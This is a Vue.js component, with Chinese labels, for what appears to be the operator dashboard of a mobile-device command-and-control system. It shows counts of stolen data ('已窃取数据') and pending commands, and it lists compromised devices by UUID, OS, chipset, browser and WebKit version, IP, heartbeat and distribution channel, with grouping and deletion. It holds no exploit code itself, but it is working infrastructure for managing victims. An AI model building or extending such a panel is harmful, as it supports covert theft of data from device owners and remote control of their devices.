<template>
  <div class="devices-page">
    <div class="page-card group-sidebar">
      <div class="page-header" style="margin-bottom:12px;padding-bottom:12px;">
        <div class="page-title" style="font-size:15px;">设备分组</div>
      </div>
      <el-input v-model="newGroupName" size="small" placeholder="新分组名称" style="margin-bottom:8px;" />
      <el-button type="primary" size="small" style="width:100%;margin-bottom:16px;" @click="addGroup">
        <el-icon><Plus /></el-icon>
        <span>新建分组</span>
      </el-button>
      <el-menu
        :default-active="activeGroup"
        class="group-menu"
        background-color="#fafafa"
        text-color="#303133"
        active-text-color="#409eff"
        @select="handleGroupSelect"
      >
        <el-menu-item index="__all__">
          <el-icon><Folder /></el-icon>
          <span>全部设备</span>
          <el-badge :value="totalCount" class="group-count" />
        </el-menu-item>
        <el-menu-item index="__ungrouped__">
          <el-icon><FolderOpened /></el-icon>
          <span>未分组</span>
          <el-badge :value="ungroupedCount" class="group-count" />
        </el-menu-item>
        <el-sub-menu v-for="g in groups" :key="g.id" :index="'g-' + g.id">
          <template #title>
            <el-icon><Folder /></el-icon>
            <span>{{ g.name }}</span>
            <el-badge :value="g.device_count ?? g.count ?? 0" class="group-count" />
          </template>
          <el-menu-item :index="'rename-' + g.id" @click="renameGroup(g)">重命名</el-menu-item>
          <el-menu-item :index="'delete-' + g.id" @click="deleteGroup(g)">删除分组</el-menu-item>
        </el-sub-menu>
      </el-menu>
    </div>

    <div class="devices-main">
      <el-row :gutter="12" class="stats-row">
        <el-col :xs="12" :sm="12" :md="8" :lg="4">
          <div class="stat-card" style="background:linear-gradient(135deg,#409eff,#66b1ff);position:relative;overflow:hidden;">
            <div class="stat-label">设备总数</div>
            <div class="stat-value">{{ stats.total_devices }}</div>
            <el-icon class="stat-icon"><Iphone /></el-icon>
          </div>
        </el-col>
        <el-col :xs="12" :sm="12" :md="8" :lg="4">
          <div class="stat-card" style="background:linear-gradient(135deg,#67c23a,#85ce61);position:relative;overflow:hidden;">
            <div class="stat-label">在线设备</div>
            <div class="stat-value">{{ stats.active_devices }}</div>
            <el-icon class="stat-icon"><Connection /></el-icon>
          </div>
        </el-col>
        <el-col :xs="12" :sm="12" :md="8" :lg="4">
          <div class="stat-card" style="background:linear-gradient(135deg,#909399,#a6a9ad);position:relative;overflow:hidden;">
            <div class="stat-label">离线设备</div>
            <div class="stat-value">{{ stats.offline_devices }}</div>
            <el-icon class="stat-icon"><Remove /></el-icon>
          </div>
        </el-col>
        <el-col :xs="12" :sm="12" :md="8" :lg="4">
          <div class="stat-card" style="background:linear-gradient(135deg,#13c2c2,#36cfc9);position:relative;overflow:hidden;">
            <div class="stat-label">今日新增</div>
            <div class="stat-value">{{ stats.today_new_devices }}</div>
            <el-icon class="stat-icon"><Promotion /></el-icon>
          </div>
        </el-col>
        <el-col :xs="12" :sm="12" :md="8" :lg="4">
          <div class="stat-card" style="background:linear-gradient(135deg,#722ed1,#9254de);position:relative;overflow:hidden;">
            <div class="stat-label">已窃取数据</div>
            <div class="stat-value">{{ stats.total_exfil }}</div>
            <el-icon class="stat-icon"><DataLine /></el-icon>
          </div>
        </el-col>
        <el-col :xs="12" :sm="12" :md="8" :lg="4">
          <div class="stat-card" style="background:linear-gradient(135deg,#fa8c16,#ffa940);position:relative;overflow:hidden;">
            <div class="stat-label">待执行命令</div>
            <div class="stat-value">{{ stats.pending_commands }}</div>
            <el-icon class="stat-icon"><Warning /></el-icon>
          </div>
        </el-col>
      </el-row>

      <div class="page-card">
        <div class="page-header">
          <div>
            <div class="page-title">设备管理</div>
            <div class="page-subtitle">共 {{ totalCount }} 台设备，在线 {{ onlineCount }} 台</div>
          </div>
          <div style="display:flex;gap:8px;">
            <el-button :disabled="!selected.length" @click="batchAction('group')">
              <el-icon><Folder /></el-icon>
              <span>批量设组</span>
            </el-button>
            <el-button :disabled="!selected.length" type="danger" @click="batchAction('delete')">
              <el-icon><Delete /></el-icon>
              <span>批量删除</span>
            </el-button>
          </div>
        </div>

        <div class="search-bar">
          <el-input v-model="filters.q" placeholder="搜索 UUID / IP / OS" clearable class="search-input" @clear="loadList" @keyup.enter="loadList">
            <template #prefix><el-icon><Search /></el-icon></template>
          </el-input>
          <el-select v-model="filters.status" placeholder="状态" clearable class="search-select">
            <el-option label="在线" value="active" />
            <el-option label="离线" value="offline" />
          </el-select>
          <el-select v-model="filters.os" placeholder="系统" clearable class="search-select">
            <el-option v-for="v in osVersions" :key="v" :label="'iOS ' + v" :value="v" />
          </el-select>
          <el-select v-model="filters.channel" placeholder="渠道" clearable class="search-select search-channel">
            <el-option v-for="c in channels" :key="c.id" :label="c.name" :value="c.id" />
          </el-select>
          <el-button type="primary" @click="loadList">
            <el-icon><Search /></el-icon>
            <span>搜索</span>
          </el-button>
          <el-button @click="resetFilters">重置</el-button>
        </div>

        <el-table
          ref="tableRef"
          :data="list"
          stripe
          @selection-change="handleSelectionChange"
        >
          <el-table-column type="selection" width="42" fixed="left" />
          <el-table-column prop="device_uuid" label="设备 UUID" min-width="150">
            <template #default="{ row }">
              <span class="mono text-muted" :title="row.device_uuid">{{ shortUuid(row.device_uuid) }}</span>
            </template>
          </el-table-column>
          <el-table-column label="系统" min-width="100">
            <template #default="{ row }">
              <template v-if="row.os_version">
                <el-tag size="small" effect="plain" :type="(row.os_type||'').toLowerCase()==='android' ? 'warning' : ((row.os_type||'').toLowerCase()==='macos' ? 'info' : 'primary')">
                  {{ row.os_type || 'iOS' }} {{ row.os_version }}
                </el-tag>
              </template>
              <span v-else>-</span>
            </template>
          </el-table-column>
          <el-table-column prop="device_model" label="型号" min-width="120">
            <template #default="{ row }">
              <span>{{ row.device_model || row.hw_model || '-' }}</span>
              <div v-if="row.chipset" class="text-muted" style="font-size:11px;line-height:1.2;margin-top:2px;">
                🧠 {{ row.chipset }}
              </div>
            </template>
          </el-table-column>
          <el-table-column label="浏览器" min-width="140">
            <template #default="{ row }">
              <template v-if="row.browser_name || row.browser_version">
                <el-tag size="small" effect="plain" :type="browserTagType(row.browser_name)">
                  {{ row.browser_name || '-' }}
                  <span v-if="row.browser_version" style="margin-left:4px;opacity:.75;">v{{ row.browser_version }}</span>
                </el-tag>
                <div v-if="row.webkit_version" class="text-muted" style="font-size:11px;line-height:1.2;margin-top:2px;">
                  WebKit {{ row.webkit_version }}
                </div>
              </template>
              <span v-else>-</span>
            </template>
          </el-table-column>
          <el-table-column prop="ip" label="IP 地址" min-width="120">
            <template #default="{ row }"><span class="mono">{{ row.ip || '-' }}</span></template>
          </el-table-column>
          <el-table-column prop="status" label="状态" min-width="80">
            <template #default="{ row }">
              <span class="status-dot" :class="isOnline(row) ? 'dot-success' : 'dot-info'"></span>
              <span style="margin-left:6px;">{{ isOnline(row) ? '在线' : '离线' }}</span>
            </template>
          </el-table-column>
          <el-table-column prop="group_name" label="分组" min-width="90">
            <template #default="{ row }">{{ row.group_name || '<未分组>' }}</template>
          </el-table-column>
          <el-table-column prop="channel_name" label="渠道" min-width="90" />
          <el-table-column prop="first_seen" label="首次上线" min-width="140">
            <template #default="{ row }">
              <el-tooltip :content="formatDate(row.first_seen)">
                <span class="text-muted">{{ formatRelative(row.first_seen) }}</span>
              </el-tooltip>
            </template>
          </el-table-column>
          <el-table-column prop="last_seen" label="最近心跳" min-width="140">
            <template #default="{ row }">
              <el-tooltip :content="formatDate(row.last_seen)">
                <span class="text-muted">{{ formatRelative(row.last_seen) }}</span>
              </el-tooltip>
            </template>
          </el-table-column>
          <el-table-column label="操作" width="220" fixed="right">
            <template #default="{ row }">
              <el-button type="primary" link size="small" @click="goDetail(row)">详情</el-button>
              <el-button type="primary" link size="small" @click="openSetGroup(row)">设组</el-button>
              <el-button type="danger" link size="small" @click="deleteRow(row)">删除</el-button>
            </template>
          </el-table-column>
        </el-table>

        <el-pagination
          v-model:current-page="page"
          v-model:page-size="pageSize"
          :page-sizes="[20, 50, 100, 200]"
          :total="totalCount"
          :layout="paginationLayout"
          :small="isSmallScreen"
          background
          @current-change="loadList"
          @size-change="loadList"
        />
      </div>
    </div>

    <el-dialog v-model="groupDialog" title="设置分组" width="min(420px, 92%)">
      <el-form label-width="80px">
        <el-form-item label="目标分组">
          <el-select v-model="selectedGroupId" placeholder="选择分组" style="width:100%;">
            <el-option label="<未分组>" value="" />
            <el-option v-for="g in groups" :key="g.id" :label="g.name" :value="g.id" />
          </el-select>
        </el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="groupDialog = false">取消</el-button>
        <el-button type="primary" @click="confirmSetGroup">确定</el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted, onUnmounted, computed } from 'vue'
import { useRouter } from 'vue-router'
import { ElMessage, ElMessageBox } from 'element-plus'
import { Plus, Search, Folder, FolderOpened, Delete, Iphone, Connection, Remove, Promotion, DataLine, Warning } from '@element-plus/icons-vue'
import axios from '../utils/axios'
import { formatDate, formatRelative, shortUuid, require2FA } from '../utils/twofa'

const router = useRouter()

const list = ref([])
const totalCount = ref(0)
const onlineCount = ref(0)
const ungroupedCount = ref(0)
const page = ref(1)
const pageSize = ref(50)
const selected = ref([])
const activeGroup = ref('__all__')
const groups = ref([])
const channels = ref([])
const osVersions = ref([])
const filters = reactive({ q: '', status: '', os: '', channel: '' })
const newGroupName = ref('')

// 响应式屏幕宽度：驱动分页栏 layout / small 模式
const screenWidth = ref(typeof window !== 'undefined' ? window.innerWidth : 1280)
const isSmallScreen = computed(() => screenWidth.value < 768)
const paginationLayout = computed(() => {
  if (screenWidth.value < 480) return 'total, prev, pager, next'
  if (screenWidth.value < 768) return 'total, prev, pager, next, jumper'
  return 'total, sizes, prev, pager, next, jumper'
})
function _onResize() { screenWidth.value = window.innerWidth }

const stats = reactive({
  total_devices: 0, active_devices: 0, offline_devices: 0,
  today_new_devices: 0, total_exfil: 0, pending_commands: 0,
})

function isOnline(row) {
  if (!row) return false
  const s = String(row.status || '').toLowerCase()
  if (s === 'active' || s === 'online') return true
  const ls = row.last_seen
  if (ls) {
    try {
      const t = new Date(ls).getTime()
      if (t) return Date.now() - t < 5 * 60 * 1000
    } catch {}
  }
  return false
}

function browserTagType(name) {
  const n = String(name || '').toLowerCase()
  if (!n) return 'info'
  if (n === 'safari') return 'success'
  if (['chrome', 'edge', 'firefox', 'opera', 'brave', 'duckduckgo'].includes(n)) return 'primary'
  if (['微信', 'qq'].includes(n) || /wechat|micromessenger/i.test(n)) return 'warning'
  return 'info'
}

async function loadStats() {
  try {
    const res = await axios.get('/api/devices/stats')
    const d = res.data || {}
    stats.total_devices = Number(d.total_devices) || 0
    stats.active_devices = Number(d.active_devices) || 0
    stats.offline_devices = Number(d.offline_devices) || 0
    stats.today_new_devices = Number(d.today_new_devices) || 0
    stats.total_exfil = Number(d.total_exfil) || 0
    stats.pending_commands = Number(d.pending_commands) || 0
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '统计数据加载失败'
    ElMessage.error(msg)
    stats.total_devices = 0
    stats.active_devices = 0
    stats.offline_devices = 0
    stats.today_new_devices = 0
    stats.total_exfil = 0
    stats.pending_commands = 0
  }
}

const groupDialog = ref(false)
const targetUuids = ref([])
const selectedGroupId = ref('')

function handleSelectionChange(val) {
  selected.value = val
}

function handleGroupSelect(index) {
  if (index.startsWith('rename-') || index.startsWith('delete-')) return
  activeGroup.value = index
  page.value = 1
  loadList()
}

function goDetail(row) {
  router.push(`/devices/${row.device_uuid}`)
}

function resetFilters() {
  filters.q = ''
  filters.status = ''
  filters.os = ''
  filters.channel = ''
  page.value = 1
  loadList()
}

async function loadList() {
  try {
    const params = {
      skip: (page.value - 1) * pageSize.value,
      limit: pageSize.value,
      search: filters.q || undefined,
      status: filters.status || undefined,
      os_version: filters.os || undefined,
      channel_id: filters.channel || undefined,
    }
    if (activeGroup.value === '__ungrouped__') params.ungrouped_only = true
    else if (activeGroup.value.startsWith('g-')) params.group_id = parseInt(activeGroup.value.slice(2)) || activeGroup.value.slice(2)
    const res = await axios.get('/api/devices', { params })
    list.value = res.data?.items || res.data || []
    totalCount.value = res.data?.total ?? list.value.length
    onlineCount.value = list.value.filter(isOnline).length
    ungroupedCount.value = list.value.filter(d => !d.group_name && !d.group_id).length
    const seen = new Set()
    const arr = []
    for (const d of list.value) {
      const v = String(d.os_version || d.ios_version || '').trim()
      if (v && !seen.has(v)) { seen.add(v); arr.push(v) }
    }
    arr.sort((a, b) => b.localeCompare(a, undefined, { numeric: true, sensitivity: 'base' }))
    osVersions.value = arr
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '设备列表加载失败'
    ElMessage.error(msg)
    list.value = []
    totalCount.value = 0
    onlineCount.value = 0
    ungroupedCount.value = 0
    osVersions.value = []
  }
}

async function loadGroups() {
  try {
    const res = await axios.get('/api/devices/groups')
    groups.value = res.data?.items || res.data || []
    if (res.data?.ungrouped_count != null) {
      ungroupedCount.value = res.data.ungrouped_count
    }
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '分组加载失败'
    ElMessage.error(msg)
    groups.value = []
  }
}

async function loadChannels() {
  try {
    const res = await axios.get('/api/channels', { params: { skip: 0, limit: 200 } })
    channels.value = res.data?.items || res.data || []
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '渠道加载失败'
    ElMessage.error(msg)
    channels.value = []
  }
}

async function addGroup() {
  if (!newGroupName.value.trim()) return
  try {
    const otp = await require2FA('create device group')
    if (otp === false) return
    const params = {}
    if (otp) params.otp_code = otp
    await axios.post('/api/devices/groups', { name: newGroupName.value.trim() }, { params })
    ElMessage.success('分组创建成功')
    newGroupName.value = ''
    loadGroups()
  } catch (e) {
    const msg = e?.response?.data?.detail || e?.message || '创建失败'
    ElMessage.error(typeof msg === 'string' ? msg : '创建失败')
  }
}

async function renameGroup(g) {
  try {
    const { value } = await ElMessageBox.prompt('请输入新分组名称', '重命名分组', {
      inputValue: g.name,
      inputValidator: v => !!v.trim() || '名称不能为空'
    })
    const otp = await require2FA('rename device group')
    if (otp === false) return
    const params = {}
    if (otp) params.otp_code = otp
    await axios.patch(`/api/devices/groups/${g.id}`, { name: value }, { params })
    ElMessage.success('已重命名')
    loadGroups()
  } catch (e) {
    if (e !== 'cancel' && e !== 'close') {
      const msg = e?.response?.data?.detail || e?.message || '重命名失败'
      ElMessage.error(typeof msg === 'string' ? msg : '重命名失败')
    }
  }
}

async function deleteGroup(g) {
  try {
    await ElMessageBox.confirm(`确认删除分组「${g.name}」？该分组下的设备将变为未分组。`, '删除分组', { type: 'warning' })
    const otp = await require2FA('delete device group')
    if (otp === false) return
    const params = {}
    if (otp) params.otp_code = otp
    await axios.delete(`/api/devices/groups/${g.id}`, { params })
    ElMessage.success('分组已删除')
    loadGroups()
    if (activeGroup.value === 'g-' + g.id) {
      activeGroup.value = '__all__'
      loadList()
    }
  } catch (e) {
    if (e !== 'cancel' && e !== 'close') {
      const msg = e?.response?.data?.detail || e?.message || '删除失败'
      ElMessage.error(typeof msg === 'string' ? msg : '删除失败')
    }
  }
}

function openSetGroup(row) {
  targetUuids.value = [row.device_uuid]
  selectedGroupId.value = row.group_id != null ? row.group_id : ''
  groupDialog.value = true
}

function batchAction(type) {
  if (type === 'group') {
    targetUuids.value = selected.value.map(r => r.device_uuid)
    selectedGroupId.value = ''
    groupDialog.value = true
  } else if (type === 'delete') {
    deleteRows(selected.value)
  }
}

async function confirmSetGroup() {
  try {
    const otp = await require2FA('move device group')
    if (otp === false) return
    const params = {}
    if (otp) params.otp_code = otp
    const payload = {
      device_uuids: targetUuids.value,
      group_id: selectedGroupId.value === '' ? null : (typeof selectedGroupId.value === 'string' ? parseInt(selectedGroupId.value) : selectedGroupId.value)
    }
    await axios.post('/api/devices/batch-set-group', payload, { params })
    ElMessage.success(`已将 ${targetUuids.value.length} 台设备移动分组`)
    groupDialog.value = false
    loadList()
  } catch (e) {
    const err = e?.response?.data?.detail
    if (err) {
      ElMessage.error(typeof err === 'string' ? err : '操作失败')
    } else {
      const msg = e?.message || '操作失败'
      ElMessage.error(typeof msg === 'string' ? msg : '操作失败')
    }
  }
}

async function deleteRow(row) {
  await deleteRows([row])
}

async function deleteRows(rows) {
  try {
    await ElMessageBox.confirm(`确认删除 ${rows.length} 台设备？此操作不可恢复。`, '删除设备', { type: 'warning' })
    const otp = await require2FA('delete device')
    if (otp === false) return
    const params = {}
    if (otp) params.otp_code = otp
    const device_uuids = rows.map(r => r.device_uuid)
    await axios.post('/api/devices/batch-delete', { device_uuids }, { params })
    ElMessage.success(`已删除 ${rows.length} 台设备`)
    loadList()
  } catch (e) {
    if (e !== 'cancel' && e !== 'close') {
      const err = e?.response?.data?.detail || e?.message || '删除失败'
      ElMessage.error(typeof err === 'string' ? err : '删除失败')
    }
  }
}

onMounted(() => {
  loadGroups()
  loadChannels()
  loadStats()
  loadList()
  window.addEventListener('resize', _onResize)
})

onUnmounted(() => {
  window.removeEventListener('resize', _onResize)
})
</script>

<style scoped>
/* ===== 整体布局：左侧分组栏 + 右侧主区，窄屏堆叠 ===== */
.devices-page {
  display: flex;
  flex-wrap: wrap;
  gap: 16px;
  width: 100%;
  min-width: 0;
  box-sizing: border-box;
}
.group-sidebar {
  width: 240px;
  flex: 0 0 240px;
  padding: 16px;
  box-sizing: border-box;
}
.devices-main {
  flex: 1 1 320px;
  min-width: 0; /* 关键：允许 flex 子项收缩到内容以下，防止表格撑破页面 */
}

/* ===== 统计卡行 ===== */
.stats-row {
  margin-bottom: 16px;
}

/* ===== 搜索栏：允许换行，输入框自适应 ===== */
.search-bar {
  flex-wrap: wrap;
  gap: 8px;
}
.search-input {
  width: 280px;
  max-width: 100%;
  flex: 1 1 220px;
}
.search-select {
  width: 140px;
  flex: 1 1 120px;
}
.search-channel {
  width: 160px;
  flex: 1 1 140px;
}

/* ===== 表格：宽度 100%，超出时表格内部水平滚动（不撑破页面） ===== */
.devices-main :deep(.el-table) {
  width: 100%;
}

/* ===== 分页栏：窄屏右对齐、不溢出 ===== */
.devices-main :deep(.el-pagination) {
  margin-top: 12px;
  justify-content: flex-end;
  flex-wrap: wrap;
}

/* ===== 分组菜单 ===== */
.group-menu {
  border-radius: 6px;
}
.group-menu :deep(.el-menu-item) {
  display: flex;
  justify-content: space-between;
  align-items: center;
}
.group-count {
  margin-left: auto;
}

/* ===== 状态点 ===== */
.status-dot {
  display: inline-block;
  width: 8px;
  height: 8px;
  border-radius: 50%;
  vertical-align: middle;
}
.dot-success { background: #67c23a; box-shadow: 0 0 0 3px rgba(103,194,58,0.18); }
.dot-info { background: #909399; }

/* ===== 响应式断点 ===== */
/* 中屏：分组栏收窄 */
@media (max-width: 1199px) {
  .group-sidebar {
    flex: 0 0 200px;
    width: 200px;
  }
}

/* 窄屏：分组栏堆叠到顶部，限高内部滚动 */
@media (max-width: 991px) {
  .group-sidebar {
    flex: 1 1 100%;
    width: 100%;
    max-height: 280px;
    overflow-y: auto;
  }
  .devices-main {
    flex: 1 1 100%;
  }
}

/* 超窄屏：统计卡 2 列、搜索框全宽 */
@media (max-width: 575px) {
  .search-input,
  .search-select,
  .search-channel {
    width: 100%;
    flex: 1 1 100%;
  }
  .devices-main :deep(.el-pagination) {
    justify-content: center;
  }
}
</style>
